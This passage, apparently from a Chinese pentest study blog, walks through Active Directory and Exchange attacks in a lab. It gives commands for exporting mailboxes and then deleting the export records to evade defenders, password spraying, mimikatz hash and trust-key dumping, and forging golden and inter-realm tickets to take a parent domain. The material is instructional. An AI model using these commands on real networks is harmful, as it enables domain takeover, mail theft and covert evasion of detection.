<p>将 Administrator 用户添加到 Mailbox Import Export  角色组里，将用户添加到角色组后，需要重启 Exchange 服务才能执行导出操作</p>
<p>添加用户权限</p>
<pre class="line-numbers language-none"><code class="language-none">New-ManagementRoleAssignment -Name &quot;Import Export_Domain Admins&quot; -User &quot;Administrator&quot; -Role &quot;Mailbox Import Export&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>导出后，注意删除权限（删除刚刚添加的 Mailbox Import Export 角色组中的用户）</p>
<pre class="line-numbers language-none"><code class="language-none">Remove-ManagementRoleAssignment &quot;Import Export_Domain Admins&quot; -Confirm:$false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="设置网络共享文件夹">设置网络共享文件夹</h4>
<p><mark>不论使用哪种方式导出邮件，都需要将文件放置在 UNC（Universal Naming Convention，通用命名规则，也称通用命名规范、通用命名约定）路径下</mark>。类似于 “\\hostname\sharename”、“\\ipaddress\sharename” 的网络路径就是UNC路径，sharename 为网络共享名称。</p>
<p>首先开启共享，这里演示将 C 盘 inetpub 文件夹设置为 everyone 可读写，以便将电子邮件从Exchange服务器中导出，执行如下命令：</p>
<pre class="line-numbers language-none"><code class="language-none">net share inetpub&#x3D;c:\inetpub &#x2F;grant:everyone,full
#看到提示信息“共享成功”后，可以键入如下命令，查看共享文件夹
net share<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="导出用户的电子邮件">导出用户的电子邮件</h4>
<p>使用 PowerShell 导出电子邮件，用户的电子邮箱目录一般为Inbox（收件箱）、SentItems（已发送邮件）、DeleteItems（已删除邮件）、Drafts（草稿）等</p>
<pre class="line-numbers language-none"><code class="language-none">#使用New-MailboxExporRequest命令，可以将指定用户的所有邮件导出
New-MailboxExportRequest -Mailbox administrator -FilePath \\192.168.7.77\inetpub\administrator.pst<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>使用图形化界面导出电子邮件，在浏览器地址栏中输入“IP\ecp”，打开 Exchange 管理中心的登录界面。</p>
<p><mark>输入账号密码(之前添加到Mailbox Import Export角色组中的用户账号和密码)登录 Exchange 管理中心，单击“收件人”选项，可以看到当前电子邮箱的信息</mark>。单击“+”按钮，可以将域用户添加到Exchange服务器中。<mark>选中要导出邮件的用户(比如这里的administrator)，单击“…”按钮，然后选择“导出到PST文件”选项，进入“导出到.pst”&quot; 界面，单击“浏览”按钮，单击“下一步”按钮，设置导出路径(该路径需为UNC路径)即可</mark></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119154748486.png" alt="image-20231119154748486"></p>
<h4 id="管理导出请求-痕迹清除">管理导出请求(痕迹清除)</h4>
<p>不论是使用Powershell导出电子邮件，还是通过图形化界面导出电子邮件，<mark>在创建导出请后，都会在Exchange中留下相关信息，这些信息有助于蓝队人员发现服务器中的异常行为</mark>。</p>
<p>通过以下命令，可以查看之前的导出请求记录信息。</p>
<pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>将指定用户已经完成的导出请求删除</p>
<pre class="line-numbers language-none"><code class="language-none">Remove-MailboxExportRequest -Identity Administrator\MailboxExport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>删除所有已完成的导出请求</p>
<pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>删除所有导出请求，包括完成和失败的请求</p>
<pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest | Remove-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Exchange-在域中的权限">Exchange 在域中的权限</h3>
<p>查看 Exchange 服务器的隶属关系，发现其属于：<code>Exchange Security Groups</code></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119171403916.png" alt="image-20231119171403916"></p>
<p>再跟进CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=pentest,DC=lab</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119171511352.png" alt="image-20231119171511352"></p>
<p>该组又隶属于CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=pentest,DC=lab，该组包含通过管理服务代表用户运行 Exchange cmdlet 的 Exchange 服务器。其成员有权读取和修改所有 Windows 帐户和组。</p>
<p>最后的结论就是 <mark>Exchange 服务器有权限修改域内任意用户的 ACL，因此，可以利用 Exchange 修改用户 ACL，然后再利用 Dcsync 来 dump hash</mark>。这里再理一下思路，<mark>在域环境中，如果安装Exchange后，系统会添加一个名为Microsoft Exchange Security Groups、Exchange Trusted Subsystem和Exchange Windows Permission三个组。如果获得了这三个组内任意用户的控制权限，就能够继承用户组的WriteDACL权限，WriteDACL权限可以修改域对象的ACL，最终实现利用DCSync导出域内所有用户hash，实现权限提升的目的</mark>。</p>
<h3 id="Exchange-接口利用">Exchange 接口利用</h3>
<p>前面介绍过，Exchange 提供了多种客户端邮箱接口和服务接口，对于渗透测试人员而言，这些接口就是踏入 Exchange 内部的第一道关卡，提供服务的接口需要有效的用户凭证信息，显然，用户名与密码破解是摆在面前的第一个尝试。<mark>在企业域环境中，Exchange 与域服务集合，域用户账户密码就是 Exchange 邮箱的账户密码，因此，如果通过暴力破解等手段成功获取了邮箱用户密码，在通常情况下也就间接获得了域用户密码</mark>。下面列举两种爆破密码的方法：</p>
<ul>
<li>利用自动发现服务进行暴力破解</li>
</ul>
<p>Autodiscover自动发现服务使用Autodiscover.xml配置文件来对用户进行自动设置，获取该自动配置文件需要用户认证，如访问<code>http://test2k12.fb.com/Autodiscover/Autodiscover.xml</code>文件将提示需要认证，如果认证通过，将获取到如下的XML文件内容：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119174410024.png" alt="image-20231119174410024"></p>
<p>利用这个接口，可以对邮箱账号做暴力破解。Ruler工具提供了对Exchange的自动配置文件接口进行认证的暴力破解，通过配置线程数、间隔时间可以限制破解速度防止多次登陆失败触发告警或账户被封禁</p>
<p>Ruler下载地址：<a target="_blank" rel="noopener" href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a></p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;ruler --url https:&#x2F;&#x2F;172.16.147.4&#x2F;autodiscover&#x2F;autodiscover.xml --domain pentest.lab --insecure brute --users user.txt --passwords pass.txt --delay 0 --verbose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119174605545.png" alt="image-20231119174605545"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119174723927.png" alt="image-20231119174723927"></p>
<ul>
<li>Password Spray</li>
</ul>
<p>password spray同样是一种破解账户密码的方法，与常规的暴力破解方法不同的是，<mark>password spary针对一批账户进行破解，每次对单个用户账户进行一次或少数次登陆尝试后换用下一个用户进行尝试，如此反复进行并间隔一定时间，以此方法躲避多次暴力破解的检测和账户锁定的风险</mark>。</p>
<p>mailsniper工具提供分别针对 <code>OWA</code> 接口、<code>EWS</code> 接口和 <code>ActiveSync</code> 接口的 password spray。</p>
<p>mailsniper下载地址：<a target="_blank" rel="noopener" href="https://github.com/dafthack/MailSniper">https://github.com/dafthack/MailSniper</a></p>
<pre class="line-numbers language-none"><code class="language-none">Invoke-PasswordSprayEWS -ExchHostname exchange.pentest.lab -UserList .\user.txt -Password 123456 -ExchangeVersion Exchange2016<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119181052583.png" alt="image-20231119181052583"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119181153507.png" alt="image-20231119181153507"></p>
<h1>跨域攻击</h1>
<h2 id="常见的跨域攻击方法">常见的跨域攻击方法</h2>
<p>常见的跨域攻击方法有以下几种：</p>
<ul>
<li>利用常规的渗透方法，比如利用 Web 漏洞跨域获取权限</li>
<li>利用已知散列值进行哈希传递或票据传递，因为有可能域内的密码是通用的</li>
<li>利用域信任关系</li>
</ul>
<p>下面会着重介绍第三种，即利用域信任关系进行跨域攻击</p>
<h2 id="利用域信任关系进行跨域攻击">利用域信任关系进行跨域攻击</h2>
<p>当有多个域时，不同的域之间想进行资源共享，就需要用到域信任，只有当域之间互相信任后，才能进行资源共享。</p>
<p><mark>域信任关系可分为单向信任和双向信任</mark>。单向信任即 A 信任 B，但 B 不信任 A，双向信任同理。在创建子域时，系统会在新的子域和父域之间自动创建双向可传递信任关系。</p>
<p>这里说一下单向信任，在受信任城和信任域之间的单向信任中，受信任域内的用户(或者计算机）可以访问信任域内的资源，但信任域内的用户无法访问受信任域内的资源。<mark>简单来说就是，域A信任域B，则域B可以访问域A</mark></p>
<p><mark>域信任关系又可分为内部信任和外部信任</mark>。内部信任是指在同一个林中域之间的信任关系，这种信任关系是可传递的；外部信任指不同林之间域的信任关系，这种信任关系要视林间信任类型来判断是不是可传递</p>
<p>在 Windows 操作系统中，只有 Domain Admins 组中的用户可以管理域信任关系；Enterprise Admins 组（仅出现在林的根域中）的成员对林中所有域拥有完全控制权限，默认情况下，该组包含林中所有域控上具有 administrators 权限的成员。</p>
<p>这里先提一下Enterprise Admins 组，先思考一个问题：根域和子域是如何进行划分的，又或者说根域和子域是如何进行权限划分的？答案就是通过Enterprise Admins组来进行划分，就是根域下存在这个组，子域并不存在这个组，又或者说在域森林中只有根域有这个组因此根域的管理员能操作整个域，我们在域森林中横向的目的也是最终拿下这个组下的用户。Enterprise Admins 组的RID为519，RID的相关概念下面会讲到。</p>
<h3 id="获取域信息">获取域信息</h3>
<p>这里使用 lg工具 进行域内信息的收集，lg 是一款用 C++ 编写的用于管理本地用户组和域本地用户组的命令行工具，可用它来收集远程主机用户和组的信息。</p>
<p>lg工具下载地址：<a target="_blank" rel="noopener" href="http://www.joeware.net/freetools/tools/lg/index.htm">http://www.joeware.net/freetools/tools/lg/index.htm</a></p>
<pre class="line-numbers language-none"><code class="language-none">#枚举 teamssix 域中的用户组
lg.exe teamssix\.
#枚举远程计算机的用户组，如果提示拒绝访问，说明没有信任关系
lg.exe \\dc
#枚举远程计算机的用户名
lg.exe \\dc -lu
#枚举远程系统中全部用户的 SID
lg.exe \\dc -lu -sidsout
#枚举远程系统指定组中的所有成员的 SID
lg.exe \\dc\administrators -lu -sidsout<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>对于域信任关系还可以做一些信息收集，如下</p>
<pre class="line-numbers language-none"><code class="language-none">#这里使用nltest命令，是Windows操作系统自带的命令行工具，可以先查看一下使用文档
nltest &#x2F;? &gt; document.txt 2&gt;&amp;1
#这个命令将 &quot;nltest &#x2F;?&quot; 的标准输出和错误输出都重定向到名为document.txt的文件中。如果document.txt不存在，则会创建该文件；如果存在，则会覆盖原有内容

#下面介绍nltest命令的使用
#列出指定域的域控制器列表
nltest &#x2F;DCLIST:&lt;DomainName&gt;
#nltest &#x2F;DCLIST:xxx.com
#检索当前域与其他域之间的信任关系信息
nltest &#x2F;domain_trusts [过滤参数]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>nltest /domain_trusts还有一些过滤参数，如下</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231123110949893.png" alt="image-20231123110949893"></p>
<p>下面对于nltest /domain_trusts命令列出的信息格式做一个说明</p>
<p>我这里以<code>0: ONE one.com (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound)</code>为例</p>
<ul>
<li>
<p>0：域的编号(只起到一个编号的作用)</p>
</li>
<li>
<p><mark>ONE one.com</mark>：表示与当前域建立了信任关系的目标域的名称</p>
</li>
<li>
<p>NT 5：NT 5 表明Windows内核版本，表示该域的版本号为 Windows 2000 或更高版本，它可能是个默认值(即如果回显数据包没有中特别指名，会默认成NT 5)</p>
</li>
<li>
<p><mark>Forest Tree Root</mark>：表示信任关系。常见的信任关系的值有：</p>
<ul>
<li>Parent/Child：父子域之间的信任关系</li>
<li>Tree Root/Tree Root：树根域之间的信任关系</li>
<li>External/Internal：外部域和内部域之间的信任关系</li>
<li>Forest/Forest：域林之间的信任关系</li>
<li>Forest Tree Root：应该表达的是，域林根域之间的信任关系</li>
</ul>
</li>
<li>
<p><mark>Direct Outbound</mark>：表示访问方向(也有说表示信任关系的方向的，我这里使用访问方向更容易理解)。常见的访问方向有：</p>
<ul>
<li>
<p>Direct Inbound：直接入站，意味着从目标域可以访问当前域</p>
</li>
<li>
<p>Direct Outbound：直接出站，意味着从当前域可以访问目标域</p>
<p>注意，两个值也有可能同时出现，应该表示允许双向访问。</p>
</li>
</ul>
</li>
</ul>
<p>再看一个例子，<code>1: A a.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)</code></p>
<ul>
<li>Primary Domain：表示该域是主域</li>
<li>Native：表示该域是本机相关的或者原生的</li>
</ul>
<p>换句话说就是，<mark>这条记录表示域信任自身（即域自己信任自己）</mark></p>
<p>还可以使用netdom工具(也是Windows自带的)，如下</p>
<pre class="line-numbers language-none"><code class="language-none">#查询当前域与其他域之间的信任关系
netdom query trust<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>在域控上，也可以使用Get-ADUser方法</p>
<pre class="line-numbers language-none"><code class="language-none">#Get-ADUser方法属于ActiveDirectory模块，在域控安装AD时会默认安装
#可以先检查一下是否存在该模块
get-module -listavailable
#get-module activedirectory -listavailable
#如果不存在，可以通过以下方式安装
Import-Module ServerManager
Add-WindowsFeature RSAT-AD-PowerShell

#使用前需要导入模块
import-module activedirectory
#获取 Active Directory 中以 $ 结尾的所有用户帐户
Get-ADUser -Filter &#123;samAccountName -like &quot;*$&quot;&#125;
#获取 Active Directory 中所有用户帐户
Get-ADUser -Filter &#123;samAccountName -like &quot;*&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231123124839572.png" alt="image-20231123124839572"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231123125015738.png" alt="image-20231123125015738"></p>
<p>在收集完域信任关系后，可以利用域信任关系做进一步的信息收集</p>
<p>可以使用adfind工具获取信任域的完整信息</p>
<pre class="line-numbers language-none"><code class="language-none">.\adfind.exe -h bdc1.b.com -sc u:Administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231123191410551.png" alt="image-20231123191410551"></p>
<p>通过对比目标域和当前域的用户列表，同时加入两个域的用户属于敏感用户，可以重点关注。</p>
<p><mark>不仅仅是加入多个域的用户属于敏感用户，用户组中的外部用户也属于敏感用户</mark>，也应该重点关注</p>
<p>这里使用PowerView模块中的Get-DomainForeignGroupMember方法列出目标域用户组中的外部用户，如下</p>
<pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;blob&#x2F;dev&#x2F;Recon&#x2F;PowerView.ps1
Import-Module .\PowerView.ps1
Get-DomainForeignGroupMember -Domain new.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231123191758426.png" alt="image-20231123191758426"></p>
<h3 id="利用域信任密钥获取目标域权限">利用域信任密钥获取目标域权限</h3>
<p>假设环境如下：</p>
<ul>
<li>父域的域控：<a target="_blank" rel="noopener" href="http://dc.teamssix.com">dc.teamssix.com</a></li>
<li>子域的域控：<a target="_blank" rel="noopener" href="http://subdc.sub.teamssix.com">subdc.sub.teamssix.com</a></li>
<li>子域内的计算机：<a target="_blank" rel="noopener" href="http://user4.sub.teamssix.com">user4.sub.teamssix.com</a></li>
<li>子域内的普通用户：user4</li>
<li>子域作为当前域，父域作为目标域</li>
</ul>
<p>在子域的域控中使用 mimikatz 获取需要的信息</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe privilege::debug &quot;lsadump::lsa &#x2F;patch &#x2F;user:administrator&quot; &quot;lsadump::trust &#x2F;patch&quot; exit
#如果不在子域的域控上，可以在子域的其他机器上执行以下命令。但是为了成功执行命令，需要具有足够的权限
mimikatz.exe privilege::debug &quot;lsadump::dcsync &#x2F;domain:子域 &#x2F;user:子域域管用户名&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231123101908005.png" alt="image-20231123101908005"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231123102133307.png" alt="image-20231123102133307"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231123102852927.png" alt="image-20231123102852927"></p>
<p><mark>得到当前域(子域)的 SID 、目标域(父域)的 SID 和当前域(子域)域管 NTLM 哈希</mark>后，在子域的普通用户机器上利用 mimikatz 制作信任票据</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;kerberos::golden &#x2F;domain:sub.teamssix.com &#x2F;sid:S-1-5-21-1655164184-1934932396-2547489287 &#x2F;sids:S-1-5-21-2230503874-1187844892-774991719-519 &#x2F;rc4:5bfd59b5e1f78a794f714af07eac869f &#x2F;user:administrator &#x2F;service:krbtgt &#x2F;target:teamssix.com &#x2F;ticket:subdc_administrator.kirbi&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里解释一下上面这条命令及其参数的含义，如下</p>
<ul>
<li>/domain：指定当前域名</li>
<li>/sid：指定当前域的SID</li>
<li>/sids：指定目标域的SID-要创建的用户所属的组的SID</li>
<li>/rc4：指定信任密钥 ，即当前域域管 NTLM 哈希</li>
<li>/user：指定伪造的用户名</li>
<li>/service：指定要访问的服务</li>
<li>/target：指定目标域名</li>
<li>/ticket：指定保存票据的文件名</li>
</ul>
<blockquote>
<p>注意，这里的 sids 是“指定目标域的SID-要创建的用户所属的组的SID”，这个要创建的用户所属的组的SID又称RID，通常是519。在当前演示场景下，就是“父域sid-519”。至于RID和SID的关系以及为什么是519，下面会解释。</p>
</blockquote>
<p>这里有必要介绍一下sid，比较<mark>常用的有用户sid、组sid、域sid</mark>，此外还有进程sid，具体介绍如下。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122150151438.png" alt="image-20231122150151438"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122193511301.png" alt="image-20231122193511301"></p>
<p>某些 SID 的值在所有系统中都是恒定的。 这些 SID 是在安装操作系统或域时创建的。 它们被称为公认 SID，因为它们标识通用用户或通用组。下表列出了通用的公认 SID：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122204538542.png" alt="image-20231122204538542"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122205332507.png" alt="image-20231122205332507"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122205345317.png" alt="image-20231122205345317"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122205405827.png" alt="image-20231122205405827"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122205752388.png" alt="image-20231122205752388"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122205425098.png" alt="image-20231122205425098"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122205447167.png" alt="image-20231122205447167"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122205504459.png" alt="image-20231122205504459"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122205519869.png" alt="image-20231122205519869"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122205542400.png" alt="image-20231122205542400"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122205601381.png" alt="image-20231122205601381"></p>
<p>上面说到域sid的构成中还有个“相对标识符”，它其实也是一个sid，为了同“域标识符”区分，所以称作“相对”，“相对”的英文是“relative”所以就称为rid了，但是它实质上也是一个sid，说它是sid一部分是相对于域sid来说的【域sid的构成中有相对标识符，可以理解为一个大sid(域sid)包含着一个小sid(相对标识符)】，这里也介绍一下：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122210402143.png" alt="image-20231122210402143"></p>
<p>同样，RID也有通用的公认的RID，如下</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122212019604.png" alt="image-20231122212019604"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122212034221.png" alt="image-20231122212034221"></p>
<p>利用刚刚制作的信任票据获取目标域中目标服务的 TGS 并保存到文件中</p>
<p>这里用到asktgs.exe和kirbikator.exe，给出一个github上的汇总项目提供下载：<a target="_blank" rel="noopener" href="https://github.com/NotScortator/asktgs_compiled">https://github.com/NotScortator/asktgs_compiled</a></p>
<pre class="line-numbers language-none"><code class="language-none">asktgs.exe subdc_administrator.kirbi cifs&#x2F;dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>将获取的 TGS 票据注入到内存中</p>
<pre class="line-numbers language-none"><code class="language-none">kirbikator.exe lsa cifs.dc.teamssix.com.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>获得权限，使用 dir 访问目标域控</p>
<pre class="line-numbers language-none"><code class="language-none">dir \\dc.teamssix.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122134723631.png" alt="image-20231122134723631"></p>
<h3 id="利用-krbtgt-散列值获取目标域的权限">利用 krbtgt 散列值获取目标域的权限</h3>
<p>这其实是使用SIDHistory进行跨域信任并搭配黄金票据的一种利用方式，有师傅称为SIDHistory版黄金票据，我觉得很形象。这里先介绍一下SIDHistory</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231123115901743.png" alt="image-20231123115901743"></p>
<p>SIDHistory版黄金票据的基础是森林内信任关系，因为如果不是森林内信任关系，则 SIDHistory 会被微软的 SID Filter 规则过滤掉，从而失效，但森林内部不会有 SID Filter 规则。</p>
<p><mark>由于每个域的 SID 都不同，叠加 SIDHistory 的黄金票据不具备通用性</mark>。但是根据微软的描述，在同一个域森林内部，企业管理组 EA(Enterprise Administrators) 会自动被森林内部所有域加入到本域的域管理员组，且 EA 只存在于根域中，所以 企业管理组EA 的 SID 固定为 “根域的SID加上固定的RID(即519)”。<mark>总结一下就是，企业管理组EA的SID是个例外，用它制作的黄金票据具有通用性</mark>。</p>
<p><mark>如果使用企业管理组 EA 的 SID 设置 SIDHistory 属性，和黄金票据结合，则在只获取任意一个域 krbtgt 账号 NTLM 值的前提下，即可实现森林内部所有域的跨域黄金票据</mark>，这种票据可简称为 SIDHistory 版黄金票据。</p>
<p>如果攻击者获取了林内任意域的 krbtgt 散列值，就可以使用 sidHistory 获得该林的完整权限。</p>
<p>首先获取当前子域和父域的 SID 值，可以使用以下工具或命令</p>
<p>下面会使用到Adfind工具，Adfind是一款在域环境下非常强大的信息搜集工具，允许用户在域环境下轻松搜集各种信息。它提供了大量的选项，可以优化搜索并返回相关详细信息，是内网域渗透中的一款利器。</p>
<p>Adfind下载地址：<a target="_blank" rel="noopener" href="https://www.softpedia.com/dyn-postdownload.php/20ad8842aeff38fec0fe96f07fd40e22/655e11d4/140b0/4/2">https://www.softpedia.com/dyn-postdownload.php/20ad8842aeff38fec0fe96f07fd40e22/655e11d4/140b0/4/2</a></p>
<pre class="line-numbers language-none"><code class="language-none">#使用wmic命令
wmic useraccount get caption, sid
#wmic useraccount get name, sid
#使用whoami
whoami &#x2F;user
#使用Adfind工具
adfind.exe -sc u:user4 | findstr Sid
#使用PowerView脚本中的方法【https:&#x2F;&#x2F;github.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;blob&#x2F;dev&#x2F;Recon&#x2F;PowerView.ps1】
Set-ExecutionPolicy Unrestricted
Import-Module .\PowerView.ps1
Get-DomainSID sub.teamssix.com
Get-DomainTrust -APi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>接下来获取子域的 krbtgt 的哈希值，使用 mimikatz 即可</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz privilege::debug &quot;lsadump::lsa &#x2F;patch &#x2F;user:krbtgt&quot; sekurlsa::krbtgt exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在子域普通用户权限的计算机中构造黄金票据并注入内存</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;Kerberos::golden &#x2F;user:Administrator &#x2F;domain:sub.teamssix.com &#x2F;sid:S-1-5-21-1655164184-1934932396-2547489287 &#x2F;sids:S-1-5-21-2230503874-1187844892-774991719-519 &#x2F;krbtgt:b53a5c7c51648f033b96971e7ae4ee45 &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>还是解释一下上面这条命令及其参数的含义，如下：</p>
<ul>
<li>/user：指定伪造的用户名</li>
<li>/domain：指定当前域名</li>
<li>/sid：指定当前域的SID</li>
<li>/sids：指定目标域的SID-要创建的用户所属的组的SID</li>
<li>/krbtgt：指定krbtgt 的哈希值</li>
<li>/ptt：表示将票据注入内存</li>
</ul>
<p>获得权限，使用 dir 访问目标域控</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231122195224274.png" alt="image-20231122195224274"></p>
<h3 id="利用无约束委派和-MS-RPRN-获取信任林权限">利用无约束委派和 MS-RPRN 获取信任林权限</h3>
